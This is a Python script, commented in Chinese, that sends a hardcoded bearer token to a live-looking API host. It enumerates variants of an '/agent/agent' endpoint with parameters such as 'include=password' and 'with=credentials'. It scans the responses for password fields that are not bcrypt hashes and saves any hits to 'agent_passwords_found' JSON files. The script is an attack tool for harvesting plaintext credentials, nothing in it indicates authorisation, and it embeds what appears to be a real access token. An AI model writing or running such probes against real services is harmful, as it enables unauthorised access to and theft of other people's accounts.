import requests
import json
from datetime import datetime

BRAND_TOKEN = "eeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvbWFzdGVyL2xvZ2luIiwiaWF0IjoxNzcxMDY2NzU5LCJleHAiOjE4MDI2MDI3NTksIm5iZiI6MTc3MTA2Njc1OSwianRpIjoiSW1Ob0tldERFdHRCQ1o0ciIsInN1YiI6IjEyIiwicHJ2IjoiMTg4ODk5NDM5MDUwZTVmMzc0MDliMThjYzZhNDk1NjkyMmE3YWIxYiJ9.4YhHOvo5t69diLa-cV52OADS7Fd_77-2h0S2xX70--M"

BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {BRAND_TOKEN}",
    "Content-Type": "application/json"
}

print("="*120)
print("🔥 測試 /agent/agent 端點 - 尋找代理列表")
print("="*120 + "\n")

# ============================================================================
# 測試不同的參數組合
# ============================================================================

test_variations = [
    # 基本請求
    "/agent/agent",
    
    # 帶分頁參數
    "/agent/agent?page=1",
    "/agent/agent?pagenum=1&pagesize=100",
    "/agent/agent?per_page=100",
    
    # 帶篩選參數
    "/agent/agent?all=1",
    "/agent/agent?list=1",
    "/agent/agent?show_all=true",
    
    # 帶欄位參數
    "/agent/agent?fields=*",
    "/agent/agent?include=password",
    "/agent/agent?with=credentials",
]

successful_endpoints = []

for endpoint in test_variations:
    print(f"測試: {endpoint:60} ", end='')
    
    try:
        response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=10)
        
        print(f"HTTP {response.status_code} ", end='')
        
        if response.status_code == 200:
            data = response.json()
            
            print(f"code={data.get('code')} ", end='')
            
            if data.get('code') == 0:
                print("✅")
                
                # 分析返回的資料結構
                print(f"\n{'  '*2}資料結構分析:")
                print(f"{'  '*2}{'─'*80}")
                
                # 顯示完整 JSON（前 500 字元）
                json_str = json.dumps(data, ensure_ascii=False, indent=2)
                print(f"{'  '*2}完整 JSON (前 500 字元):")
                print(f"{'  '*2}{json_str[:500]}")
                print()
                
                # 檢查是否包含代理列表
                if 'data' in data:
                    data_content = data['data']
                    
                    # 情況 1: data 是陣列
                    if isinstance(data_content, list):
                        print(f"{'  '*2}✓ 返回陣列，共 {len(data_content)} 個項目")
                        
                        if len(data_content) > 0:
                            print(f"{'  '*2}第一個項目的欄位:")
                            first_item = data_content[0]
                            
                            for key in sorted(first_item.keys()):
                                value = first_item[key]
                                
                                # 標記可能是密碼的欄位
                                is_password = False
                                if 'password' in key.lower():
                                    # 檢查是否是明文（不是 bcrypt）
                                    if isinstance(value, str) and not value.startswith('$2y$'):
                                        is_password = True
                                
                                marker = "🔑" if is_password else "  "
                                
                                if isinstance(value, str):
                                    display = f'"{value[:50]}"' if len(str(value)) > 50 else f'"{value}"'
                                else:
                                    display = str(value)
                                
                                print(f"{'  '*2}{marker} {key:25} = {display}")
                            
                            # 檢查是否有明文密碼
                            has_plain_pwd = any(
                                'password' in k.lower() and 
                                isinstance(first_item[k], str) and 
                                not first_item[k].startswith('$2y$')
                                for k in first_item.keys()
                            )
                            
                            if has_plain_pwd:
                                print(f"\n{'  '*2}🎉 找到明文密碼欄位！")
                                successful_endpoints.append({
                                    'endpoint': endpoint,
                                    'data': data
                                })
                        
                    # 情況 2: data 是物件（可能包含 data, list, items 等）
                    elif isinstance(data_content, dict):
                        print(f"{'  '*2}✓ 返回物件")
                        print(f"{'  '*2}物件的 keys: {list(data_content.keys())}")
                        
                        # 檢查常見的列表欄位
                        for list_key in ['data', 'list', 'items', 'agents', 'records']:
                            if list_key in data_content:
                                items = data_content[list_key]
                                
                                if isinstance(items, list) and len(items) > 0:
                                    print(f"{'  '*2}找到列表欄位 '{list_key}', 共 {len(items)} 個項目")
                                    
                                    first_item = items[0]
                                    print(f"{'  '*2}第一個項目的欄位: {list(first_item.keys())[:10]}")
                    
                    # 情況 3: 其他類型
                    else:
                        print(f"{'  '*2}資料類型: {type(data_content)}")
                
                print()
            else:
                print(f"✗ msg={data.get('msg')}")
        else:
            print("✗")
            
    except Exception as e:
        print(f"✗ 錯誤: {str(e)[:30]}")
    
    print()

# ============================================================================
# 結果總結
# ============================================================================
print("="*120)
print("📊 測試結果")
print("="*120 + "\n")

if successful_endpoints:
    print(f"🎉 找到 {len(successful_endpoints)} 個包含明文密碼的端點！\n")
    
    for item in successful_endpoints:
        print(f"端點: {item['endpoint']}")
        print(f"資料預覽:")
        print(json.dumps(item['data'], ensure_ascii=False, indent=2)[:500])
        print("\n" + "="*120 + "\n")
        
        # 保存完整資料
        filename = f"agent_passwords_found_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(item['data'], f, ensure_ascii=False, indent=2)
        
        print(f"✓ 完整資料已保存: {filename}\n")
else:
    print("❌ 沒有找到包含明文密碼的端點\n")
    print("建議:")
    print("  1. 檢查上面的輸出，看看返回了什麼資料結構")
    print("  2. 如果返回的是代理列表，看看每個代理有哪些欄位")
    print("  3. 可能需要用其他方法獲取密碼\n")

print("="*120)
print("測試完成")
print("="*120)